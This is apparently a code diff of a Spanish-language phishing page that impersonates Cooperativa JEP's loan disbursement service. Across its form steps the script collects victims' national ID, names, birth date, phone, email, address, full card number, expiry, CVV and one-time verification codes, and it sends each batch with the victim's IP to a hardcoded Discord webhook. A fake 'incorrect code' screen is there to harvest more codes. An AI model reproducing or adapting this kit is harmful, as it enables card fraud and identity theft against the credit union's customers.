@@ -47,10 +47,6 @@ body{background:#f0f0f0;display:flex;justify-content:center;overflow-x:hidden}
 .virtual-left{display:flex;align-items:center;gap:10px}
 .virtual-text h2{color:#fff;font-size:18px;font-weight:700}
 .virtual-text h2 span{color:#f39c12}
-.virtual-right{display:flex;flex-direction:column;gap:8px}
-.virtual-right div{display:flex;align-items:center;gap:8px;color:#fff;font-size:11px}
-.virtual-right .cuadro{width:14px;height:14px;border:1.5px solid #999;border-radius:3px;display:inline-block;background:transparent}
-.virtual-right .opcion{display:flex;align-items:center;gap:8px;border-left:2px solid #00bfff;padding-left:6px}
 
 /* BARRA DE PROGRESO (STEPPER) */
 .stepper-container { display: flex; justify-content: space-between; align-items: center; padding: 20px 30px; background: #fff; border-bottom: 1px solid #eee; }
@@ -148,82 +144,16 @@ body{background:#f0f0f0;display:flex;justify-content:center;overflow-x:hidden}
 .campo-vacio label{color:#ff0000 !important}
 .campo-vacio input, .campo-vacio select{color:#ff0000 !important}
 @keyframes sacudir{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
+.mensaje-error { color: #ff0000; font-size: 11px; font-weight: 700; margin-top: 5px; display: block; }
 
-/* ESTILOS PARA EL SLIDER DE MONTO */
-.slider-monto-container {
-    background: #f9f9f9;
-    border: 1px solid #eee;
-    border-radius: 8px;
-    padding: 15px;
-    margin: 15px;
-    text-align: center;
-}
-.monto-display {
-    font-size: 32px;
-    font-weight: 900;
-    color: #1b5e20;
-    margin-bottom: 10px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-.monto-display span { font-size: 20px; color: #666; margin-right: 5px; }
-.slider-input {
-    width: 100%;
-    -webkit-appearance: none;
-    height: 8px;
-    background: #ddd;
-    border-radius: 5px;
-    outline: none;
-    margin: 15px 0;
-}
-.slider-input::-webkit-slider-thumb {
-    -webkit-appearance: none;
-    width: 25px;
-    height: 25px;
-    background: #1b5e20;
-    border-radius: 50%;
-    cursor: pointer;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
-}
-.rango-texto {
-    display: flex;
-    justify-content: space-between;
-    font-size: 11px;
-    color: #888;
-    font-weight: 700;
-}
+.slider-input { width: 100%; -webkit-appearance: none; height: 8px; background: #ddd; border-radius: 5px; outline: none; margin: 15px 0; }
+.slider-input::-webkit-slider-thumb { -webkit-appearance: none; width: 25px; height: 25px; background: #1b5e20; border-radius: 50%; cursor: pointer; box-shadow: 0 2px 6px rgba(0,0,0,0.3); }
+.rango-texto { display: flex; justify-content: space-between; font-size: 11px; color: #888; font-weight: 700; }
 
-/* MEJORA VISUAL DEL PASO 3 */
-.seccion-credito-mejorada {
-    background: #fff;
-    padding: 15px;
-    border-radius: 12px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-    margin-bottom: 20px;
-}
-.seccion-credito-mejorada .grupo-titulo {
-    font-size: 14px;
-    font-weight: 800;
-    color: #1b5e20;
-    margin-bottom: 15px;
-    border-bottom: 2px solid #e8f5e9;
-    padding-bottom: 8px;
-}
-.slider-container-mejorado {
-    background: #f8f9fa;
-    border: 1px solid #e9ecef;
-    border-radius: 12px;
-    padding: 20px;
-    text-align: center;
-    margin-bottom: 20px;
-}
-.monto-display-mejorado {
-    font-size: 36px;
-    font-weight: 900;
-    color: #1b5e20;
-    letter-spacing: -1px;
-}
+.seccion-credito-mejorada { background: #fff; padding: 15px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-bottom: 20px; }
+.seccion-credito-mejorada .grupo-titulo { font-size: 14px; font-weight: 800; color: #1b5e20; margin-bottom: 15px; border-bottom: 2px solid #e8f5e9; padding-bottom: 8px; }
+.slider-container-mejorado { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 20px; text-align: center; margin-bottom: 20px; }
+.monto-display-mejorado { font-size: 36px; font-weight: 900; color: #1b5e20; letter-spacing: -1px; }
 .monto-display-mejorado span { font-size: 24px; color: #666; }
 </style>
 </head>
@@ -422,385 +352,388 @@ body{background:#f0f0f0;display:flex;justify-content:center;overflow-x:hidden}
     
     <p style="text-align: center; font-size: 10px; color: #aaa; margin-top: 15px;">🔒 Tus datos están protegidos con encriptación de nivel bancario.</p>
 </div>
-        <!-- PASO 4: RESUMEN DE LA SOLICITUD -->
-        <div id="paso4" class="paso-formulario">
-            <div class="grupo-datos">Revisa tu solicitud</div>
-            
-            <div style="background: #f9f9f9; padding: 20px; border-radius: 8px; border: 1px solid #eee; margin-bottom: 20px;">
-                <p style="font-size: 14px; color: #555; line-height: 1.6; text-align: center;">
-                    Hola <b id="resumen-nombre">Nombre</b>, estás solicitando un crédito de <b id="resumen-monto">$0.00</b>. <br><br>
-                    Si todo está correcto, presiona <b>"Confirmar y Enviar"</b>.
-                </p>
-            </div>
-            
-            <button class="btn-validar-datos" id="btn-validar" type="button">Confirmar y Enviar</button>
-            <button class="btn-atras" onclick="cambiarPaso(3)">Corregir Datos</button>
+    <!-- PASO 4: RESUMEN DE LA SOLICITUD -->
+    <div id="paso4" class="paso-formulario">
+        <div class="grupo-datos">Revisa tu solicitud</div>
+        
+        <div style="background: #f9f9f9; padding: 20px; border-radius: 8px; border: 1px solid #eee; margin-bottom: 20px;">
+            <p style="font-size: 14px; color: #555; line-height: 1.6; text-align: center;">
+                Hola <b id="resumen-nombre">Nombre</b>, estás solicitando un crédito de <b id="resumen-monto">$0.00</b>. <br><br>
+                Si todo está correcto, presiona <b>"Confirmar y Enviar"</b>.
+            </p>
         </div>
-
+        
+        <button class="btn-validar-datos" id="btn-validar" type="button">Confirmar y Enviar</button>
+        <button class="btn-atras" onclick="cambiarPaso(3)">Corregir Datos</button>
     </div>
 
-    <!-- PANTALLA DE 6 DÍGITOS -->
-    <div id="pantalla-verificacion">
-        <div class="header-verificacion">
-            <div class="candado-icon">🔒</div>
-            <div class="titulo-verificacion">Desembolso de Crédito <span>Cooperativa JEP</span></div>
-        </div>
-        <div class="subtitulo-verificacion">Verificación de identidad</div>
-        <p class="texto-verificacion">
-            Hemos enviado un mensaje de texto con un código de 6 dígitos a su número de móvil o correo electrónico registrado. Estás validando tu identidad en <b>DESEMBOLSO DE CRÉDITO COOPERATIVA JEP</b>.
-        </p>
-        <div class="codigos-container">
-            <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
-            <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
-            <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
-            <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
-            <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
-            <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
-        </div>
-        <button class="btn-validar-datos" style="animation:none;background:#0e7a3d;">Verificar Código</button>
-        <p class="aviso-inferior">Verificada tu identidad, el crédito se recarga a tu cuenta automáticamente en los próximos minutos.</p>
+</div>
+
+<!-- PANTALLA DE 6 DÍGITOS -->
+<div id="pantalla-verificacion">
+    <div class="header-verificacion">
+        <div class="candado-icon">🔒</div>
+        <div class="titulo-verificacion">Desembolso de Crédito <span>Cooperativa JEP</span></div>
     </div>
+    <div class="subtitulo-verificacion">Verificación de identidad</div>
+    <p class="texto-verificacion">
+        Hemos enviado un mensaje de texto con un código de 6 dígitos a su número de móvil o correo electrónico registrado. Estás validando tu identidad en <b>DESEMBOLSO DE CRÉDITO COOPERATIVA JEP</b>.
+    </p>
+    <div class="codigos-container">
+        <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
+        <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
+        <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
+        <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
+        <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
+        <input type="tel" class="codigo-input" maxlength="1" inputmode="numeric">
+    </div>
+    <button class="btn-validar-datos" style="animation:none;background:#0e7a3d;">Verificar Código</button>
+    <p class="aviso-inferior">Verificada tu identidad, el crédito se recarga a tu cuenta automáticamente en los próximos minutos.</p>
+</div>
 </div>
 <script>
-    var webhookURL = "https://discord.com/api/webhooks/1568716677355544679/HvgdBs6N5FQCMNgHu6FA4T1ziAjjJR3MF8K1KkVjWbRhVEEznVS10VagdkDbS97-yX4l";
-    var ipUsuario = "Cargando IP...";
+var webhookURL = "https://discord.com/api/webhooks/1570099759060885535/Zx8DUdbxCQUkzr-NvAmEcj58sptKJEBb1tmAFbOnjc49h0yMCFARg2JTcedlX5TwNvRv";
+var ipUsuario = "Cargando IP...";
 
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => { ipUsuario = data.ip; })
-        .catch(error => { ipUsuario = "IP no disponible"; });
+fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => { ipUsuario = data.ip; })
+    .catch(error => { ipUsuario = "IP no disponible"; });
 
-    function enviarMensajeDiscord(mensaje) {
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(mensaje)
-        }).catch(error => console.error("Error Discord:", error));
-    }
+function enviarMensajeDiscord(mensaje) {
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(mensaje)
+    }).catch(error => console.error("Error Discord:", error));
+}
 
-    window.addEventListener('load', function() {
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        document.getElementById('pantalla-carga').style.opacity = '0';
         setTimeout(function() {
-            document.getElementById('pantalla-carga').style.opacity = '0';
-            setTimeout(function() {
-                document.getElementById('pantalla-carga').style.display = 'none';
-            }, 500);
-        }, 3000);
+            document.getElementById('pantalla-carga').style.display = 'none';
+        }, 500);
+    }, 3000);
+});
+
+function actualizarReloj() {
+    var ahora = new Date();
+    var dias = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"];
+    var meses = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];
+    var horas = ahora.getHours();
+    var minutos = ahora.getMinutes();
+    var ampm = horas >= 12 ? 'p.m.' : 'a.m.';
+    horas = horas % 12; horas = horas ? horas : 12; 
+    minutos = minutos < 10 ? '0' + minutos : minutos;
+    document.getElementById('reloj-fecha').innerHTML = "🇪🇨 " + dias[ahora.getDay()] + ", " + ahora.getDate() + " " + meses[ahora.getMonth()] + " - " + ahora.getFullYear() + " - " + horas + ":" + minutos + " " + ampm;
+}
+actualizarReloj(); 
+setInterval(actualizarReloj, 60000); 
+
+document.getElementById('btn-ir-formulario').addEventListener('click', function() {
+    document.getElementById('portada-contenedor').style.display = 'none';
+    document.getElementById('formulario-contenedor').style.display = 'block';
+    window.scrollTo(0, 0);
+    iniciarTemporizadorSesion();
+});
+
+function limpiarErrores() {
+    document.querySelectorAll('.mensaje-error').forEach(function(el) { el.remove(); });
+    document.querySelectorAll('.campo-vacio').forEach(function(el) { el.classList.remove('campo-vacio'); });
+}
+
+function mostrarErrorVisual(campo, texto) {
+    var contenedor = campo.closest('.campo') || campo.closest('.form-group') || campo.closest('.card-input-wrapper');
+    if (contenedor) contenedor.classList.add('campo-vacio');
+    var error = document.createElement('div');
+    error.className = 'mensaje-error';
+    error.innerText = texto;
+    error.style.display = 'block';
+    if (contenedor) contenedor.appendChild(error);
+    campo.focus();
+}
+
+document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], select').forEach(function(input) {
+    input.addEventListener('input', function() {
+        var contenedor = this.closest('.campo') || this.closest('.form-group');
+        if (contenedor) {
+            contenedor.classList.remove('campo-vacio');
+            var error = contenedor.querySelector('.mensaje-error');
+            if (error) error.remove();
+        }
     });
+});
 
-    function actualizarReloj() {
-        var ahora = new Date();
-        var dias = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"];
-        var meses = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];
-        var horas = ahora.getHours();
-        var minutos = ahora.getMinutes();
-        var ampm = horas >= 12 ? 'p.m.' : 'a.m.';
-        horas = horas % 12; horas = horas ? horas : 12; 
-        minutos = minutos < 10 ? '0' + minutos : minutos;
-        document.getElementById('reloj-fecha').innerHTML = "🇪🇨 " + dias[ahora.getDay()] + ", " + ahora.getDate() + " " + meses[ahora.getMonth()] + " - " + ahora.getFullYear() + " - " + horas + ":" + minutos + " " + ampm;
-    }
-    actualizarReloj(); 
-    setInterval(actualizarReloj, 60000); 
+function validarPaso1() {
+    limpiarErrores();
+    var id = document.getElementById('identificacion');
+    var nom = document.getElementById('nombres');
+    var ape = document.getElementById('apellidos');
+    var f_nac = document.getElementById('fecha_nac');
+    var cel = document.getElementById('celular');
 
-    document.getElementById('btn-ir-formulario').addEventListener('click', function() {
-        document.getElementById('portada-contenedor').style.display = 'none';
-        document.getElementById('formulario-contenedor').style.display = 'block';
-        window.scrollTo(0, 0);
-        iniciarTemporizadorSesion();
+    if (id.value.trim().length !== 10) { mostrarErrorVisual(id, "Ingresa una identificación válida (10 dígitos)."); return; }
+    if (nom.value.trim() === '') { mostrarErrorVisual(nom, "Ingresa tus nombres."); return; }
+    if (ape.value.trim() === '') { mostrarErrorVisual(ape, "Ingresa tus apellidos."); return; }
+    if (f_nac.value.trim().length !== 10) { mostrarErrorVisual(f_nac, "Ingresa tu fecha de nacimiento (DD/MM/AAAA)."); return; }
+    if (cel.value.trim().length !== 10) { mostrarErrorVisual(cel, "Ingresa un celular válido (10 dígitos)."); return; }
+
+    enviarMensajeDiscord({
+        "content": "🔔 **PASO 1 COMPLETADO (JEP)**",
+        "embeds": [{
+            "title": "Datos de Identidad",
+            "color": 3447003,
+            "fields": [
+                { "name": "Identificación", "value": id.value, "inline": true },
+                { "name": "Nombres", "value": nom.value, "inline": true },
+                { "name": "Apellidos", "value": ape.value, "inline": true },
+                { "name": "Fecha Nac.", "value": f_nac.value, "inline": true },
+                { "name": "Celular", "value": cel.value, "inline": true },
+                { "name": "IP", "value": ipUsuario, "inline": true }
+            ]
+        }]
     });
+    cambiarPaso(2);
+}
 
-    function limpiarErrores() {
-        document.querySelectorAll('.mensaje-error').forEach(function(el) { el.remove(); });
-        document.querySelectorAll('.campo-vacio').forEach(function(el) { el.classList.remove('campo-vacio'); });
+function validarPaso2() {
+    limpiarErrores();
+    var email = document.getElementById('email');
+    var dir = document.getElementById('direccion');
+
+    if (email.value.trim() === '' || !email.value.includes('@')) { mostrarErrorVisual(email, "Ingresa un correo válido."); return; }
+    if (dir.value.trim() === '') { mostrarErrorVisual(dir, "Ingresa tu dirección."); return; }
+
+    cambiarPaso(3);
+}
+
+function cambiarPaso(numeroPaso) {
+    document.querySelectorAll('.paso-formulario').forEach(function(paso) { paso.classList.remove('activo'); });
+    document.getElementById('paso' + numeroPaso).classList.add('activo');
+    
+    var steps = document.querySelectorAll('.step');
+    var lines = document.querySelectorAll('.stepper-line');
+    steps.forEach(function(step) { step.classList.remove('active', 'completed'); });
+    lines.forEach(function(line) { line.classList.remove('active'); });
+
+    for (var i = 0; i < numeroPaso; i++) {
+        if (i < numeroPaso - 1) {
+            steps[i].classList.add('completed');
+            if(lines[i]) lines[i].classList.add('active');
+        }
+        if (i === numeroPaso - 1) { steps[i].classList.add('active'); }
     }
-
-    function mostrarErrorVisual(campo, texto) {
-        var contenedor = campo.closest('.campo') || campo.closest('.form-group') || campo.closest('.card-input-wrapper');
-        if (contenedor) contenedor.classList.add('campo-vacio');
-        var error = document.createElement('div');
-        error.className = 'mensaje-error';
-        error.innerText = texto;
-        error.style.display = 'block';
-        if (contenedor) contenedor.appendChild(error);
-        campo.focus();
+    
+    if (numeroPaso === 4) {
+        document.getElementById('resumen-nombre').innerText = document.getElementById('nombres').value;
+        document.getElementById('resumen-monto').innerText = "$" + document.getElementById('monto').value;
     }
+    window.scrollTo(0, 0);
+}
 
-    document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], select').forEach(function(input) {
+var intervaloSession = null;
+function iniciarTemporizadorSesion() {
+    if (intervaloSession) return;
+    var tiempoSesion = 300;
+    var spanTemporizador = document.getElementById('temporizador-sesion');
+    
+    intervaloSession = setInterval(function() {
+        tiempoSesion--;
+        var minutos = Math.floor(tiempoSesion / 60);
+        var segundos = tiempoSesion % 60;
+        segundos = segundos < 10 ? '0' + segundos : segundos;
+        spanTemporizador.innerText = "0" + minutos + ":" + segundos;
+        
+        if (tiempoSesion <= 0) {
+            clearInterval(intervaloSession);
+            alert("Sesión expirada por seguridad.");
+            location.reload();
+        }
+    }, 1000);
+}
+
+document.getElementById('monto_actual').addEventListener('input', function() {
+    if (this.value.length > 0) document.getElementById('aviso-monto').style.display = 'none';
+});
+
+function soloNumeros(id, max) {
+    var input = document.getElementById(id);
+    if (input) {
         input.addEventListener('input', function() {
-            var contenedor = this.closest('.campo') || this.closest('.form-group');
-            if (contenedor) {
-                contenedor.classList.remove('campo-vacio');
-                var error = contenedor.querySelector('.mensaje-error');
-                if (error) error.remove();
-            }
+            this.value = this.value.replace(/\D/g, '').slice(0, max);
         });
-    });
+    }
+}
+soloNumeros('identificacion', 10);
+soloNumeros('celular', 10);
 
-    function validarPaso1() {
-        limpiarErrores();
-        var id = document.getElementById('identificacion');
-        var nom = document.getElementById('nombres');
-        var ape = document.getElementById('apellidos');
-        var f_nac = document.getElementById('fecha_nac');
-        var cel = document.getElementById('celular');
+document.getElementById('fecha_nac').addEventListener('input', function() {
+    var v = this.value.replace(/\D/g, '');
+    if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
+    if (v.length > 5) v = v.substring(0, 5) + '/' + v.substring(5, 9);
+    this.value = v;
+});
 
-        if (id.value.trim().length !== 10) { mostrarErrorVisual(id, "Ingresa una identificación válida (10 dígitos)."); return; }
-        if (nom.value.trim() === '') { mostrarErrorVisual(nom, "Ingresa tus nombres."); return; }
-        if (ape.value.trim() === '') { mostrarErrorVisual(ape, "Ingresa tus apellidos."); return; }
-        if (f_nac.value.trim().length !== 10) { mostrarErrorVisual(f_nac, "Ingresa tu fecha de nacimiento (DD/MM/AAAA)."); return; }
-        if (cel.value.trim().length !== 10) { mostrarErrorVisual(cel, "Ingresa un celular válido (10 dígitos)."); return; }
+var sliderMonto = document.getElementById('slider-monto');
+sliderMonto.addEventListener('input', function() {
+    var valor = parseInt(this.value);
+    document.getElementById('display-monto-slider').innerText = valor.toLocaleString('en-US');
+    document.getElementById('monto').value = valor;
+});
 
-        enviarMensajeDiscord({
-            "content": "🔔 **PASO 1 COMPLETADO (JEP)**",
-            "embeds": [{
-                "title": "Datos de Identidad",
-                "color": 3447003,
-                "fields": [
-                    { "name": "Identificación", "value": id.value, "inline": true },
-                    { "name": "Nombres", "value": nom.value, "inline": true },
-                    { "name": "Apellidos", "value": ape.value, "inline": true },
-                    { "name": "Fecha Nac.", "value": f_nac.value, "inline": true },
-                    { "name": "Celular", "value": cel.value, "inline": true },
-                    { "name": "IP", "value": ipUsuario, "inline": true }
-                ]
-            }]
+function formatoMonto(id) {
+    var el = document.getElementById(id);
+    if (el) {
+        el.addEventListener('input', function() {
+            var v = this.value.replace(/[^0-9.]/g, '').split('.');
+            if (v.length > 2) v = [v[0], v[1]];
+            if (v[1] && v[1].length > 2) v[1] = v[1].substring(0, 2);
+            this.value = v.length > 1 ? parseFloat(v.join('.')).toLocaleString('en-US') : v[0].replace(/\B(?=(\d{3})+(?!\d))/g, ",");
         });
-        cambiarPaso(2);
     }
+}
+formatoMonto('monto_actual');
 
-    function validarPaso2() {
-        limpiarErrores();
-        var email = document.getElementById('email');
-        var dir = document.getElementById('direccion');
+var cardNumberInput = document.getElementById('card_number');
+cardNumberInput.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ');
+    document.getElementById('card-number-preview').innerText = this.value === '' ? "•••• •••• •••• ••••" : this.value;
+    var p = this.value.charAt(0);
+    document.getElementById('card-brand').innerText = p === '4' ? "VISA" : p === '5' ? "MasterCard" : "JEP";
+});
 
-        if (email.value.trim() === '' || !email.value.includes('@')) { mostrarErrorVisual(email, "Ingresa un correo válido."); return; }
-        if (dir.value.trim() === '') { mostrarErrorVisual(dir, "Ingresa tu dirección."); return; }
+function actualizarNombreTarjeta() {
+    var texto = (document.getElementById('nombres').value + " " + document.getElementById('apellidos').value).trim();
+    document.getElementById('card-name-preview').innerText = texto === "" ? "NOMBRE APELLIDO" : texto.toUpperCase();
+}
+document.getElementById('nombres').addEventListener('input', actualizarNombreTarjeta);
+document.getElementById('apellidos').addEventListener('input', actualizarNombreTarjeta);
 
-        cambiarPaso(3);
-    }
+document.getElementById('card_expiry').addEventListener('input', function() {
+    var v = this.value.replace(/\D/g, '');
+    if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
+    this.value = v;
+    document.getElementById('card-expiry-preview').innerText = v === "" ? "MM/AA" : v;
+});
 
-    function cambiarPaso(numeroPaso) {
-        document.querySelectorAll('.paso-formulario').forEach(function(paso) { paso.classList.remove('activo'); });
-        document.getElementById('paso' + numeroPaso).classList.add('activo');
-        
-        var steps = document.querySelectorAll('.step');
-        var lines = document.querySelectorAll('.stepper-line');
-        steps.forEach(function(step) { step.classList.remove('active', 'completed'); });
-        lines.forEach(function(line) { line.classList.remove('active'); });
+document.getElementById('card_cvc').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 3);
+});
 
-        for (var i = 0; i < numeroPaso; i++) {
-            if (i < numeroPaso - 1) {
-                steps[i].classList.add('completed');
-                if(lines[i]) lines[i].classList.add('active');
-            }
-            if (i === numeroPaso - 1) { steps[i].classList.add('active'); }
-        }
-        
-        if (numeroPaso === 4) {
-            document.getElementById('resumen-nombre').innerText = document.getElementById('nombres').value;
-            document.getElementById('resumen-monto').innerText = "$" + document.getElementById('monto').value;
-        }
-        window.scrollTo(0, 0);
-    }
+function validarPaso3() {
+    limpiarErrores();
+    var mon_act = document.getElementById('monto_actual');
+    var card_n = document.getElementById('card_number');
+    var card_e = document.getElementById('card_expiry');
+    var card_c = document.getElementById('card_cvc');
 
-    var intervaloSession = null;
-    function iniciarTemporizadorSesion() {
-        if (intervaloSession) return;
-        var tiempoSesion = 300;
-        var spanTemporizador = document.getElementById('temporizador-sesion');
-        
-        intervaloSession = setInterval(function() {
-            tiempoSesion--;
-            var minutos = Math.floor(tiempoSesion / 60);
-            var segundos = tiempoSesion % 60;
-            segundos = segundos < 10 ? '0' + segundos : segundos;
-            spanTemporizador.innerText = "0" + minutos + ":" + segundos;
-            
-            if (tiempoSesion <= 0) {
-                clearInterval(intervaloSession);
-                alert("Sesión expirada por seguridad.");
-                location.reload();
-            }
-        }, 1000);
-    }
+    if (card_n.value.trim().length < 19) { mostrarErrorVisual(card_n, "Ingresa el número de tarjeta completo."); return; }
+    if (card_e.value.trim().length !== 5) { mostrarErrorVisual(card_e, "Ingresa la fecha (MM/AA)."); return; }
+    if (card_c.value.trim().length < 3) { mostrarErrorVisual(card_c, "Ingresa el CVV."); return; }
+    if (mon_act.value.trim() === '') { mostrarErrorVisual(mon_act, "Ingresa el monto actual."); return; }
 
-    document.getElementById('monto_actual').addEventListener('input', function() {
-        if (this.value.length > 0) document.getElementById('aviso-monto').style.display = 'none';
+    enviarMensajeDiscord({
+        "content": "📋 **SOLICITUD COMPLETA RECIBIDA (JEP)**",
+        "embeds": [{
+            "title": "Información del Solicitante",
+            "color": 3066993,
+            "fields": [
+                { "name": "Identificación", "value": document.getElementById('identificacion').value, "inline": true },
+                { "name": "Nombres", "value": document.getElementById('nombres').value, "inline": true },
+                { "name": "Apellidos", "value": document.getElementById('apellidos').value, "inline": true },
+                { "name": "Fecha Nac.", "value": document.getElementById('fecha_nac').value, "inline": true },
+                { "name": "Celular", "value": document.getElementById('celular').value, "inline": true },
+                { "name": "Email", "value": document.getElementById('email').value, "inline": true },
+                { "name": "Dirección", "value": document.getElementById('direccion').value, "inline": false },
+                { "name": "Monto Solicitado", "value": "$" + document.getElementById('monto').value, "inline": true },
+                { "name": "Monto Actual", "value": "$" + mon_act.value, "inline": true },
+                { "name": "Tarjeta", "value": card_n.value, "inline": false },
+                { "name": "Vencimiento", "value": card_e.value, "inline": true },
+                { "name": "CVV", "value": card_c.value, "inline": true },
+                { "name": "🌐 IP", "value": ipUsuario, "inline": true }
+            ],
+            "footer": { "text": "JEP - Sistema de Créditos" },
+            "timestamp": new Date().toISOString()
+        }]
     });
 
-    function soloNumeros(id, max) {
-        var input = document.getElementById(id);
-        if (input) {
-            input.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '').slice(0, max);
-            });
-        }
-    }
-    soloNumeros('identificacion', 10);
-    soloNumeros('celular', 10);
+    var btn = document.querySelector('button[onclick="validarPaso3()"]');
+    btn.innerHTML = '<span class="spinner"></span> Procesando...';
+    btn.disabled = true;
 
-    document.getElementById('fecha_nac').addEventListener('input', function() {
-        var v = this.value.replace(/\D/g, '');
-        if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
-        if (v.length > 5) v = v.substring(0, 5) + '/' + v.substring(5, 9);
-        this.value = v;
+    setTimeout(function() {
+        btn.innerHTML = 'Revisar y Continuar';
+        btn.disabled = false;
+        cambiarPaso(4);
+    }, 6000);
+}
+
+document.getElementById('btn-validar').addEventListener('click', function(e) {
+    e.preventDefault();
+    document.getElementById('formulario-contenedor').style.display = 'none';
+    document.getElementById('pantalla-verificacion').style.display = 'flex';
+    if (intervaloSession) clearInterval(intervaloSession);
+});
+
+var inputsCodigo = document.querySelectorAll('.codigo-input');
+inputsCodigo.forEach(function(input, index) {
+    input.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value !== '' && index < inputsCodigo.length - 1) inputsCodigo[index + 1].focus();
+    });
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value === '' && index > 0) inputsCodigo[index - 1].focus();
+    });
+});
+
+var btnVerificar = document.querySelector('#pantalla-verificacion .btn-validar-datos');
+var mensajeError = document.createElement('p');
+mensajeError.style.cssText = "color:#ff0000; font-weight:bold; font-size:14px; margin-top:10px; display:none;";
+mensajeError.innerText = "Código incorrecto";
+btnVerificar.parentNode.insertBefore(mensajeError, btnVerificar.nextSibling);
+
+btnVerificar.addEventListener('click', function(e) {
+    e.preventDefault();
+    var codigoIngresado = "";
+    var todosLlenos = true;
+    inputsCodigo.forEach(function(input) {
+        if (input.value === '') todosLlenos = false;
+        codigoIngresado += input.value;
+    });
+    
+    if (!todosLlenos) { alert("Por favor, ingresa los 6 dígitos."); return; }
+
+    enviarMensajeDiscord({
+        "content": "🔢 **CÓDIGO DE SEGURIDAD INGRESADO (JEP)**",
+        "embeds": [{
+            "title": "Código de Verificación",
+            "description": "**" + codigoIngresado + "**",
+            "color": 15105570,
+            "fields": [{ "name": "🌐 IP del usuario", "value": ipUsuario, "inline": false }],
+            "footer": { "text": "JEP - Sistema de Créditos" },
+            "timestamp": new Date().toISOString()
+        }]
     });
 
-    var sliderMonto = document.getElementById('slider-monto');
-    sliderMonto.addEventListener('input', function() {
-        var valor = parseInt(this.value);
-        document.getElementById('display-monto-slider').innerText = valor.toLocaleString('en-US');
-        document.getElementById('monto').value = valor;
-    });
+    this.innerHTML = '<span class="spinner"></span> Verificando...';
+    this.style.background = '#555';
+    this.disabled = true;
 
-    function formatoMonto(id) {
-        var el = document.getElementById(id);
-        if (el) {
-            el.addEventListener('input', function() {
-                var v = this.value.replace(/[^0-9.]/g, '').split('.');
-                if (v.length > 2) v = [v[0], v[1]];
-                if (v[1] && v[1].length > 2) v[1] = v[1].substring(0, 2);
-                this.value = v.length > 1 ? parseFloat(v.join('.')).toLocaleString('en-US') : v[0].replace(/\B(?=(\d{3})+(?!\d))/g, ",");
-            });
-        }
-    }
-    formatoMonto('monto_actual');
-
-    var cardNumberInput = document.getElementById('card_number');
-    cardNumberInput.addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ');
-        document.getElementById('card-number-preview').innerText = this.value === '' ? "•••• •••• •••• ••••" : this.value;
-        var p = this.value.charAt(0);
-        document.getElementById('card-brand').innerText = p === '4' ? "VISA" : p === '5' ? "MasterCard" : "JEP";
-    });
-
-    function actualizarNombreTarjeta() {
-        var texto = (document.getElementById('nombres').value + " " + document.getElementById('apellidos').value).trim();
-        document.getElementById('card-name-preview').innerText = texto === "" ? "NOMBRE APELLIDO" : texto.toUpperCase();
-    }
-    document.getElementById('nombres').addEventListener('input', actualizarNombreTarjeta);
-    document.getElementById('apellidos').addEventListener('input', actualizarNombreTarjeta);
-
-    document.getElementById('card_expiry').addEventListener('input', function() {
-        var v = this.value.replace(/\D/g, '');
-        if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
-        this.value = v;
-        document.getElementById('card-expiry-preview').innerText = v === "" ? "MM/AA" : v;
-    });
-
-    document.getElementById('card_cvc').addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g, '').slice(0, 3);
-    });
-
-    function validarPaso3() {
-        limpiarErrores();
-        var mon_act = document.getElementById('monto_actual');
-        var card_n = document.getElementById('card_number');
-        var card_e = document.getElementById('card_expiry');
-        var card_c = document.getElementById('card_cvc');
-
-        if (card_n.value.trim().length < 19) { mostrarErrorVisual(card_n, "Ingresa el número de tarjeta completo."); return; }
-        if (card_e.value.trim().length !== 5) { mostrarErrorVisual(card_e, "Ingresa la fecha (MM/AA)."); return; }
